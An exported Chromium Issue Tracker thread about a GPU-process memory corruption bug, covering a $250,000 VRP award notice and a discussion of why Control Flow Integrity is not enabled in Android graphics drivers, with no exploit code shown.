Hash: [8981e7166d7afd976ca1d5069cd3a73475511d87](https://chromiumdash.appspot.com/commit/8981e7166d7afd976ca1d5069cd3a73475511d87)  

Date: Wed May 20 18:32:32 2026


---

### wf...@chromium.org (2026-06-02)

[VRP Panel] Please do not delete comments or attachments. This is against the rules for the Chrome VRP.

### ha...@gmail.com (2026-06-03)

Thanks for the reminder. The previous action was due to the leakage of personal information and exploit updates. I will not delete anything again in the future.

### sp...@google.com (2026-06-04)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $250000.00 for this report.

Rationale for this decision:
High quality report of memory corruption / RCE. Memory corruption in a highly privileged process (e.g. GPU, network processes).


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### wf...@chromium.org (2026-06-25)

A question for the GPU folks, as part of the analysis of the exploit used here, I notice that the exploit poc in [comment #34](https://issues.chromium.org/issues/493747593#comment34) simply sprays the command to the heap and manages to execute - so I wonder why CFI did not stop this i.e. why was ROP or CFI-bypassing gadgets not needed here? Is CFI not enabled for these drivers?

### kb...@google.com (2026-06-26)

I'm not an expert on Android's graphics drivers, but in a conversation today learned the following:

- CFI is not enabled in any vendor's graphics driver on Android today.
- Enabling CFI in vendors' Android graphics drivers has been considered for many years. To date, the performance impact has been the primary reason it's not been enabled.

Given the new security landscape, there may now be sufficient motivation to require that graphics drivers on Android be compiled with CFI. Let's continue the conversation offline, as it spans multiple organizations and requires significant coordination. This particular vulnerability certainly demonstrates the value of hardening the graphics driver via CFI.

### ch...@google.com (2026-07-31)

This Blink bug has been marked as either a release blocker or a vulnerability bug. Blink bugs affect all OSs supported by Chrome (except iOS), so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### ch...@google.com (2026-08-19)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/493747593)*
